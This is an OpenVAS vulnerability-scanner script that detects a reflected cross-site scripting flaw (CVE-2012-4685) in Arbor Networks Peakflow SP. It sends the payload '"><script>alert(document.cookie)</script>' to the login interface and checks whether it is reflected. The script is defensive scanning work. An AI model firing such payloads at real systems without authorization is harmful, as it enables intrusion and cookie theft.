##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_arbor_networks_peakflow_sp_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Arbor Networks Peakflow SP 'index/' Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Arbor Networks Peakflow SP 5.1.1 before patch 6, 5.5 before patch 4,
  and 5.6.0 before patch 1";
tag_insight = "Input appended to the URL after 'index/' in the login interface is not
  properly sanitised before being returned to the user.";
tag_solution = "Upgrade to Arbor Networks Peakflow SP 5.1.1 patch 6,
  5.5 patch 4, 5.6.0 patch 1 or later
  For updates refer to http://www.arbornetworks.com/peakflow-sp-traffic-anomaly-detection.html";
tag_summary = "This host is running Arbor Networks Peakflow SP and is prone to
  cross site scripting vulnerability.";

if(description)
{
  script_id(802958);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-4685");
  script_bugtraq_id(52881);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-09-11 11:47:18 +0530 (Tue, 11 Sep 2012)");
  script_name("Arbor Networks Peakflow SP 'index/' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/81052");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48728");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74648");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-04/0019.html");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-04/0037.html");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2012-04/0036.html");

  script_description(desc);
  script_summary("Check if Arbor Networks Peakflow SP is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 443);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("openvas-https.inc");

## Variable Initialization
req = "";
res = "";
req2 = "";
res2 = "";
url = "";
port = 0;
dir = "";

## Get Port
port = get_http_port(default:443);
if(! port){
  exit(0);
}

## Get Host Name
host = get_host_name();
if(!host){
  exit(0);
}

url = "/index";
req = string("GET ", url,  " HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");

## Confirm the application before trying exploit
res = https_req_get(port:port, request:req);

if(res && ">Welcome to Arbor Networks Peakflow SP<" >< res)
{
  ## Construct attack request
  url = url + '/"><script>alert(document.cookie)</script>';
  req2 = string("GET ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: Arbor Networks Peakflow SP XSS Test \r\n\r\n");

  ## Send request and receive the response
  res2 = https_req_get(port:port, request:req2);

  ## Confirm exploit worked by checking the response
  if(res2 && "<script>alert(document.cookie)</script>" >< res2 &&
     res2 =~ "HTTP/1.. 200" &&
     ">Welcome to Arbor Networks Peakflow SP<" >< res2){
    security_warning(port);
  }
}
